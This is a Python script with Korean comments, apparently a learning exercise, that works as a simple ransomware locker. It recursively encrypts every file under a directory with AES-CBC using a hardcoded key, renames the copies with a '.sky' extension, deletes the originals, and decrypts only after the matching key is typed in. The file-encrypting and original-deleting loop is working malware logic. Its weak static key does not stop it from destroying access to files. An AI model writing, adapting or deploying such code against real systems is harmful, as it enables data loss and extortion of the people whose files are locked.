import glob
import os
import struct
from Crypto.Cipher import AES

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024): #chunksize 한번에 읽을 데이터의 크기 64KB
    if not out_filename:
        out_filename = in_filename + '.sky' #암호화된 파일의 확장자를 sky로 지정

    iv = os.urandom(16) #무작위 16자리의 iv
    encryptor = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv) #암호화
    filesize = os.path.getsize(in_filename) #암호화 할 파일의 크기를 가져옴

    with open(in_filename, 'rb') as infile: #infile이라는 이름으로 암호화할 파일을 읽기 모드로 엶
        with open(out_filename, 'wb') as outfile: #출력파일을 바이너리 쓰기 모드로 엶
            outfile.write(struct.pack('<Q', filesize)) #8비트의 엔디언 형식으로 크기 재배열
            outfile.write(iv) #맨 앞에 iv기록, 후에 복호화할 때 필요

            while True:
                chunk = infile.read(chunksize) #chunksize의 크기만큼 읽어들이면서 반복
                if len(chunk) == 0: #chunk가 0이면 멈추기
                    break
                elif len(chunk) % 16 != 0: #16바이트에 맞춰서 암호화해야하기 때문
                    chunk += b' ' * (16 - len(chunk) % 16)#16바이트에 맞춰줌

                outfile.write(encryptor.encrypt(chunk)) #암호화

def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024): #복호화 함수 chunksize는 24KB
    if not out_filename: #출력이 없을때
        out_filename = os.path.splitext(in_filename)[0] #파일이름, 확장자 분리

    with open(in_filename, 'rb') as infile: #입력파일 읽기 보드로 열기
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]#8비트 엔디언 형식 아래에서 부터 반대로 패킹
        iv = infile.read(16) #맨앞의 iv값 가져오기
        decryptor = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv) #복호화개체 생성

        with open(out_filename, 'wb') as outfile: #출력파일 바이너리 모드로 열기
            while True:
                chunk = infile.read(chunksize) #chunksize 만큼 읽으면서 반복
                if len(chunk) == 0: 
                    break
                outfile.write(decryptor.decrypt(chunk)) #복호화

            outfile.truncate(origsize) #파일 복구

key = 'Hyeon Seong Kim!'
path = './test/**'

for filename in glob.iglob(path, recursive=True): #지정한 경로 모든파일 암호화
    if os.path.isfile(filename):
        try:
            # print('Encrypting> ' + filename)
            encrypt_file(key, filename)
            os.remove(filename) #파일자체를 암호화하는 것이 아닌 복제된 파일을 암호화하고 원본파일을 삭제함.
        except Exception as e: #예외처리
            print(f"Error encrypting {filename}: {e}")

while True:
    wow = input("KEY: ") #키 값 입력받기
    if wow == key: #키 값과 입력값이 같으면 복호화
        for filename in glob.iglob(path, recursive=True):
            if os.path.isfile(filename):
                fname, ext = os.path.splitext(filename)
                if ext == '.sky':
                    try:
                        # print('Decrypting> ' + filename)
                        decrypt_file(key, filename) #복호화
                        os.remove(filename)
                    except Exception as e:
                        print(f"Error decrypting {filename}: {e}")
        break  # 같으면 끝냄
    else:
        print("Incorrect key, please try again.")